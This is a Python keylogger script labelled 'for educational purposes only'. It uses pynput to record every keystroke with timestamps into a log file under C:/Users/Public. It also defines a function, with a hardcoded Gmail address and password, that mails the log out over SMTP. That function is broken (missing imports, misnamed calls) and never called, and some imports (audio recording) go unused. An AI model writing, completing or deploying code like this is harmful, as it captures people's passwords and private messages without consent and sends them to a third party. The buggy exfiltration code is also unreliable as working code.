"""
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Author: Yaser Kassem

This is a simple keylogger program, this was made 
for educational purposes only!
hello
This is to show that even small code software have
great power
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
"""

# Before we start writting the code we must import the following tools in order to be able to perform our keylogigng
import pynput
import logging
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd

keys_information = "KeyLog.txt"
email_address = "notaloggerprogram@gmail.com"
password = "keyl0gger!101"



# Here you can add the directory you wish to save your log file 
log_dir = r"C:/Users/Public"

# This log file will have all the keystrokes with the time it was typed, in the format as given below (TIME:MESSAGE)
logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Sending the "keylog.txt" file to an email address

def send_email(filename,attachment,toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octect-stream')
    p.set_payload(attachment).read()
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendemail(fromaddr, toaddr, text)
    s.quit()

count = 0
keys = []

# In this function it will take each key as a parameter, then this information will
# be logged in the "keyLog.txt"
def on_press(key):
    logging.info(str(key))

# Creating a listener instance and define the on-press method and join it
# with the main program thread
with Listener(on_press=on_press) as listener:
    listener.join()